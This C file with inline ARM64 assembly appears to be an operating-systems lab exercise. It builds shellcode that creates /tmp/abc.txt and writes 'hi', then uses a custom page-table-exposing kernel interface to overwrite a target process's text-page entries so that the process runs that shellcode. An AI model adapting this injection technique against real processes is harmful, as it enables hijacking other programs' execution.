#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include "expose_pte.h"

/* O_CREAT is 0100 */
/* O_RDWR is 2 */
/* O_CREAT | O_RDWR is 0102 = 66 */
/* 0644 is 420 */
/* / is 0x2F, t is 0x74, m is 0x6D, p is 0x70 */
/* a is 0x61, b is 0x62, c is 0x63, . is 0x2E */
/* t is 0x74, x is 0x78 */
/* /tmp/abc.txt\0 = 2F746D702F616263 2E74787400000000 */
/* push 0x7478742E, then push 6362612F706D742F */
/* openat is 56, write is 64, */

#define SC_LEN 84
extern void shellcode();
__asm__(".global shellcode\n"
        "shellcode:\n\t"
        "mov x15, #0x742E\n\t"
        "movk x15, #0x7478, lsl #16\n\t"
        "mov x14, #0x742F\n\t"
        "movk x14, #0x706D, lsl #16\n\t"
        "movk x14, #0x612F, lsl #32\n\t"
        "movk x14, #0x6362, lsl #48\n\t"
        "stp x14, x15, [sp, #-16]!\n\t"
        "mov x0, xzr\n\t"
        "mov x1, sp\n\t"
        "mov x2, #66\n\t"
        "mov x3, #420\n\t"
        "mov x8, #56\n\t"
        "svc #0\n\t"
        "mov x16, #0x6968\n\t"
        "str x16, [sp, #-8]!\n\t"
        "mov x1, sp\n\t"
        "mov x2, #2\n\t"
        "mov x8, #64\n\t"
        "svc #0\n\t"
	    "loop:\n\t"
	    "mov x0, x0\n\t"
	    "b loop\n\t");

int main (int argc, char* argv[]) {
    int i;
    void *sc;
    unsigned long pte_nop, pte_sc;
    unsigned long *ptep;
    unsigned long target_text_va;

    // Check arguments
    if (argc != 3) {
        printf("Usage %s target_pid va\n", argv[0]);
        exit(-1);
    }
    target_text_va = (unsigned long)strtol(argv[2], NULL, 16);

    // Prepare shellcode
    sc = mmap(NULL, 2 << 12, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (!sc) {
        printf("allocate error.\n");
        exit(-1);
    }
    for (i = 0; i < 1 << 10; i++)              // page1, nop
        ((int*)sc)[i] = 0xd503201f;            // nop opcode
    memcpy(sc + (1 << 12), &shellcode, 0x100); // page2, shellcode

    // Expose shellcode's pte
    ptep    = expose_pte_single(getpid(), (unsigned long)sc);
    pte_nop = ptep[(((unsigned long)sc >> 12) % 512)];
    pte_sc  = ptep[(((unsigned long)sc >> 12) % 512) + 1];
    ptep[(((unsigned long)sc >> 12) % 512)]     = 0;
    ptep[(((unsigned long)sc >> 12) % 512) + 1] = 0;

    // Expose sheep's pte
    ptep = expose_pte_single(atoi(argv[1]), target_text_va);

    // Code injection
    ptep[511] = pte_sc;
    for (i = 0; i < 511; ++i)
        ptep[i] = pte_nop;

    return 0;
}
